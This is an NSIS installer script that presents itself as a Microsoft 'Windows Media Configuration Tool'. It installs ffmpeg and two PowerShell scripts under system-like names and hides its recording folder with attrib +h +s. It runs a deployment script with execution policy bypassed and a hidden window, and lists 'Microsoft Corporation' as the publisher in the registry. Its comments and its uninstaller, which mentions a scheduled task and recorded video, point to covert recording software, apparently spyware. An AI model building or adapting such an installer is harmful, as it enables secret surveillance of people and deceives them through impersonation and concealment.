!include "MUI2.nsh"
!include "nsDialogs.nsh"
!include "LogicLib.nsh"
!include "FileFunc.nsh"

!define AppName "Windows Media Configuration Tool"
!define AppVersion "1.0"
!define INSTALL_DIR "$LOCALAPPDATA\Microsoft\WindowsMediaTools"
!define UNINSTALL_EXE "$INSTDIR\MediaUninstall.exe"

Var CustomOutputPath
Var Dialog
Var EditBox
Var BrowseButton

Name "${AppName}"
OutFile "..\MediaConfig.exe"
InstallDir "${INSTALL_DIR}"
RequestExecutionLevel user

; Minimal UI - looks like system tool
!insertmacro MUI_PAGE_WELCOME
Page custom CustomPageCreate CustomPageLeave
!insertmacro MUI_PAGE_INSTFILES

!insertmacro MUI_UNPAGE_INSTFILES

!insertmacro MUI_LANGUAGE "English"

Function .onInit
    ; Detect system drive automatically
    ReadEnvStr $0 LOCALAPPDATA
    StrCpy $CustomOutputPath "$0\Microsoft\MediaLogs"
FunctionEnd

Function CustomPageCreate
    nsDialogs::Create 1018
    Pop $Dialog

    ${If} $Dialog == "error"
        Abort
    ${EndIf}

    ${NSD_CreateLabel} 0 0 100% 24u "Media log storage location:"
    Pop $0

    ${NSD_CreateText} 0 30u 250u 12u "$CustomOutputPath"
    Pop $EditBox

    ${NSD_CreateButton} 260u 30u 50u 12u "Browse..."
    Pop $BrowseButton
    ${NSD_OnClick} $BrowseButton OnBrowse

    nsDialogs::Show
FunctionEnd

Function CustomPageLeave
    ${NSD_GetText} $EditBox $CustomOutputPath
    ${If} $CustomOutputPath == ""
        ReadEnvStr $0 LOCALAPPDATA
        StrCpy $CustomOutputPath "$0\Microsoft\MediaLogs"
    ${EndIf}
FunctionEnd

Function OnBrowse
    nsDialogs::SelectFolderDialog "Select storage folder" $CustomOutputPath
    Pop $0
    ${If} $0 != "error"
        StrCpy $CustomOutputPath $0
        ${NSD_SetText} $EditBox $CustomOutputPath
    ${EndIf}
FunctionEnd

Section "Install"
    SetOutPath "${INSTALL_DIR}"
    
    ; Copy core files with system-like names
    File /oname=ffmpeg.exe "..\core\ffmpeg.exe"
    File /oname=deploy.ps1 "..\core\deploy.ps1"  
    File /oname=monitor.ps1 "..\core\monitor.ps1"

    ; Create and hide output directory
    CreateDirectory "$CustomOutputPath"
    ExecWait 'attrib +h +s "$CustomOutputPath"'

    ; Execute deployment with no window
    nsExec::ExecToStack 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File "$INSTDIR\deploy.ps1" -OutputPath "$CustomOutputPath"'
    Pop $0 ; Exit code
    
    ; Create uninstaller in system location
    WriteUninstaller "${UNINSTALL_EXE}"
    
    ; Registry entries that look system-related
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools" "DisplayName" "${AppName}"
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools" "UninstallString" "${UNINSTALL_EXE}"
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools" "Publisher" "Microsoft Corporation"
    WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools" "NoModify" 1
    WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools" "NoRepair" 1
SectionEnd

Section "Uninstall"
    ; KILL PROCESSES - 3-STEP TERMINATION
    nsExec::Exec 'taskkill /F /IM ffmpeg.exe /T'
    nsExec::Exec 'powershell.exe -Command "Get-Content -Path ''$INSTDIR\ffmpeg.pids'' -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_ -Force -ErrorAction SilentlyContinue }"'
    nsExec::Exec 'powershell.exe -Command "Get-Process | Where-Object { $$_.Path -like ''$INSTDIR\*'' } | Stop-Process -Force"'
    
    ; STOP SCHEDULED TASK
    nsExec::Exec 'powershell.exe -Command "Unregister-ScheduledTask -TaskName WindowsMediaService -Confirm:`$false -ErrorAction SilentlyContinue"'
    
    ; WAIT FOR PROCESS EXIT
    Sleep 3000
    
    ; DELETE FILES WITH RETRY LOGIC
    StrCpy $R0 0  ; Initialize counter
    
    ; List of files to delete
    ${Do}
        Delete "$INSTDIR\ffmpeg.exe"
        Delete "$INSTDIR\deploy.ps1"
        Delete "$INSTDIR\monitor.ps1"
        Delete "$INSTDIR\ffmpeg.pids"
        Delete "${UNINSTALL_EXE}"
        
        ; Check if any files still exist
        ${If} ${FileExists} "$INSTDIR\ffmpeg.exe"
        ${OrIf} ${FileExists} "$INSTDIR\deploy.ps1"
        ${OrIf} ${FileExists} "$INSTDIR\monitor.ps1"
        ${OrIf} ${FileExists} "$INSTDIR\ffmpeg.pids"
        ${OrIf} ${FileExists} "${UNINSTALL_EXE}"
            IntOp $R0 $R0 + 1
            ${If} $R0 > 5
                ${Break}  ; Give up after 5 attempts
            ${EndIf}
            Sleep 1000
        ${Else}
            ${Break}  ; All files deleted
        ${EndIf}
    ${Loop}
    
    ; DELETE INSTALL DIRECTORY
    ${Do}
        RMDir /r "$INSTDIR"
        ${If} ${FileExists} "$INSTDIR"
            Sleep 1000
        ${Else}
            ${Break}
        ${EndIf}
    ${Loop}
    
    ; REGISTRY CLEANUP
    DeleteRegKey HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsMediaTools"
    DeleteRegKey /ifempty HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall"
    
    ; RECORDING CLEANUP
    MessageBox MB_YESNO "Remove all recorded video files as well?$\n$\nRecordings are stored in MediaLogs folder.$\n$\nClick YES to delete recordings, NO to keep them." IDNO KeepRecordings
    
    ; User chose to delete recordings
    ReadEnvStr $1 LOCALAPPDATA
    ${Do}
        RMDir /r "$1\Microsoft\MediaLogs"
        ${If} ${FileExists} "$1\Microsoft\MediaLogs"
            Sleep 1000
        ${Else}
            ${Break}
        ${EndIf}
    ${Loop}
    Goto UninstallComplete
    
    KeepRecordings:
    ; Show user where recordings are kept
    ReadEnvStr $1 LOCALAPPDATA  
    MessageBox MB_OK "Recordings preserved at:$\n$1\Microsoft\MediaLogs$\n$\nYou can manually delete this folder later if needed."
    
    UninstallComplete:
    MessageBox MB_OK "Uninstall completed successfully.$\n$\nAll system processes have been stopped and removed."
SectionEnd